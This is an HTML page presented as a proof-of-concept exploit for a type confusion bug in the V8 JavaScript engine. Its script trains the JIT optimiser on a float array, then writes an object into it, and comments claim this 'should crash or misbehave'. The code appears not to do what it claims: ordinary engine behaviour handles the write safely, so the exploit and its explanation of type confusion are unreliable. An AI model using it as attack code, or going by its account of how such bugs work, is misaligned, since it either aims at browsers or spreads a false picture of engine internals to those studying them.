
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>V8 Type Confusion PoC</title>
</head>
<body>
  <h1>V8 Type Confusion PoC</h1>
  <p>Check the console for output.</p>
  <script>
    function trigger() {
      function opt(arr, val) {
        arr[0] = val;
        return arr[0];
      }

      let arr = [1.1, 2.2, 3.3];

      // Train the optimizer
      for (let i = 0; i < 10000; i++) {
        opt(arr, 4.4);
      }

      // Type confusion: inject object into float array
      let confused = opt(arr, {leak: "leaked!"});

      console.log(confused.leak); // Should crash or misbehave
    }

    trigger();
  </script>
</body>
